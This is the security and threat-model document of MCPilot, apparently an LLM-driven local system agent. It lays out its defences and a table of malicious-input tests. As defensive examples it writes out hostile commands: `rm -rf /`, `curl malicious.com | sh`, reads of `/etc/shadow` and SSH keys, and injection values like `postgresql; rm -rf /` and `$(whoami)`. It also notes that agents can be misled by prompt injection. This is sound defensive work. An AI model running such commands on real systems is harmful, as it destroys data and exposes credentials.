# Security & Threat Model

MCPilot is designed to execute on a local machine with access to sensitive system information. As an LLM-driven agent, it is inherently susceptible to hallucinating dangerous commands or being tricked into executing malicious inputs (prompt injection). 

To mitigate these risks, MCPilot employs a defense-in-depth strategy where security is enforced at the core execution layer, independent of the LLM's behavior.

## 1. No Arbitrary Shell Execution
**Threat**: The LLM decides to run `rm -rf /` or `curl malicious.com | sh` to solve a problem.
**Mitigation**: MCPilot completely lacks a generic `run_command` tool.
- Every capability is exposed as a specific, typed Python function (e.g., `get_system_info`, `get_cpu_usage`).
- All subprocess calls are routed through a single `run_safe` function (`server/core/command.py`).
- `run_safe` strictly requires a list of arguments and always sets `shell=False`. String interpolation of LLM outputs into bash strings is strictly forbidden.

## 2. Path Allow-listing
**Threat**: The LLM is tricked into reading `/etc/shadow`, `~/.ssh/id_rsa`, or traversing directories out of scope.
**Mitigation**: Mandatory path validation (`server/core/fs.py::validate_path`).
- All filesystem and Git tools must pass their path arguments through `validate_path`.
- Paths are resolved to their absolute form, resolving all symlinks and `../` sequences.
- The resolved path is checked against a hardcoded allow-list (e.g., `~/Projects`, `~/Documents`).
- If `resolved_path.is_relative_to(allowed_root)` evaluates to False, a `PermissionError` is immediately raised.

## 3. Service Name Injection Prevention
**Threat**: The LLM passes `postgresql; rm -rf /` to the `get_service_status` tool.
**Mitigation**: Strict regex validation (`server/core/systemd.py::validate_service_name`).
- Service names are validated against `^[a-zA-Z0-9@_.\-]+$`.
- This rejects semicolons, pipes, ampersands, whitespace, dollar signs, and backticks.

## 4. Policy Engine and Human-in-the-Loop
**Threat**: The LLM decides to aggressively restart services or modify state without user knowledge.
**Mitigation**: Risk classification map (`server/policies.py`).
- Every tool is classified as `READ_ONLY`, `APPROVAL_REQUIRED`, or `DENIED`.
- Unmapped tools fail closed to `DENIED`.
- Mutating tools (like `restart_service`) are marked `APPROVAL_REQUIRED`.
- The execution engine pauses and requests a literal `y` input from the user before executing `APPROVAL_REQUIRED` tools.

## 5. Audit Logging
**Threat**: Lack of visibility into what the agent actually did.
**Mitigation**: Append-only JSONL audit log (`server/audit.py`).
- Every tool call, whether successful, failed, or rejected by the user, is logged to `logs/audit.jsonl` with timestamps and full argument payloads.

## 6. Output Clamping
**Threat**: The LLM requests the contents of a 10GB log file or a diff of 100,000 files, overflowing the context window and crashing the application or leading to expensive API calls.
**Mitigation**: Hardcoded limits in core functions.
- `list_processes` is clamped to a maximum of 200 processes.
- `git_diff` output is hard-capped at 10,000 characters.
- `read_file` is capped at 100,000 bytes.

---

## Malicious-Input Test Suite (Threat Model Validation)

This table outlines the explicit security tests enforced in `tests/security/test_security.py`. All tests must pass for the system to be considered secure.

| Input | Expected |
|---|---|
| `read_file("../../etc/passwd")` | DENIED — `PermissionError` / `ToolError(PATH_DENIED)` |
| `read_file("/etc/passwd")` | DENIED |
| `read_file("~")` (not under allow-list) | DENIED |
| `read_file("../../../")` | DENIED |
| `read_file` with path containing `"; rm -rf /"` | DENIED, not executed |
| `git_status(repo="/")` | DENIED |
| `get_service_status("postgresql; rm -rf /")` | DENIED — fails `SERVICE_NAME_RE` |
| `get_service_status("$(whoami)")` | DENIED |
| `restart_service("postgresql")` without approval | `approved=False`, not executed, logged |
| request for a tool named `run_command` / `delete_file` / `sudo_command` | Tool does not exist — MCP returns "unknown tool," never falls through to shell |
| `list_processes(limit=100000)` | Server clamps to a sane max, does not flood context |
| `git_diff` on a huge diff | Truncated at the documented character cap, `truncated=True` |
